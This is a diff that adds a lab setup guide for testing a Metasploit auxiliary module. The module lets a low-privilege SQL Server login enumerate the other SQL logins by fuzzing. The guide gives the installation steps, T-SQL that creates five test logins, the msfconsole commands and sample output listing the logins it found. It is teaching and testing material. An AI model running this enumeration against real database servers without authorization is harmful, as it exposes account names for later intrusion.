@@ -1,0 +1,62 @@
+SQL Server: Enumerating SQL Logins with a Low Privilege Login
+Lab setup guide
+
+Below I've provided some basic steps for setting up a SQL Server instance that can be used to replicate the scenario exploited by the mssql_enum_sql_logins.rb module.
+
+1.	Download the Microsoft SQL Server Express install that includes SQL Server Management Studio.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+2.	Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+3. Make sure to enable the tcp protocol so that module can connect to the listener.
+http://blogs.msdn.com/b/sqlexpress/archive/2005/05/05/415084.aspx
+
+4.	Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+5.	Press the "New Query" button and use the TSQL below to create five sql server logins.  
+
+-- Create logins
+CREATE LOGIN MyAppUser1 WITH PASSWORD = 'MyPassword!';
+CREATE LOGIN MyAppUser2 WITH PASSWORD = 'MyPassword!';
+CREATE LOGIN MyAppUser3 WITH PASSWORD = 'MyPassword!';
+CREATE LOGIN MyAppUser4 WITH PASSWORD = 'MyPassword!';
+CREATE LOGIN MyAppUser5 WITH PASSWORD = 'MyPassword!';
+
+4.	Log into the SQL Server with the "MyAppUser1" account and attempt to view all users.  You should only be able to view the "MyAppUser1" account and sa.
+
+-- List sql logins
+SELECT * FROM master..syslogins;
+
+5. Test out the metasploit module to enumerate other sql server logins.
+
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+msf auxiliary(mssql_enum_sql_logins) > set rhost <target ip>
+msf auxiliary(mssql_enum_sql_logins) > set rport <target database port>
+msf auxiliary(mssql_enum_sql_logins) > set username MyAppUser1
+msf auxiliary(mssql_enum_sql_logins) > set password MyPassword!
+
+msf auxiliary(mssql_enum_sql_logins) > run
+
+[*] Attempting to connect to the database server at 10.2.9.101:1433 as myappuser1...
+[+] Connected.
+[*] Checking if myappuser1 has the sysadmin role...
+[*] myappuser1 is NOT a sysadmin.
+[*] Setup to fuzz 300 SQL Server logins.
+[*] Enumerating logins...
+[+] 21 initial SQL Server logins were found.
+[*] Verifying the SQL Server logins...
+[+] 13 SQL Server logins were verified:
+[*]  - ##MS_AgentSigningCertificate##
+[*]  - ##MS_SQLAuthenticatorCertificate##
+[*]  - ##MS_SQLReplicationSigningCertificate##
+[*]  - ##MS_SQLResourceSigningCertificate##
+[*]  - BUILTIN\Users
+[*]  - BUILTIN\administrators
+[*]  - MyAppUser1
+[*]  - MyAppUser2
+[*]  - MyAppUser3
+[*]  - MyAppUser4
+[*]  - MyAppUser5
+[*]  - NT AUTHORITY\SYSTEM
+[*]  - sa
+[*] Auxiliary module execution completed
+
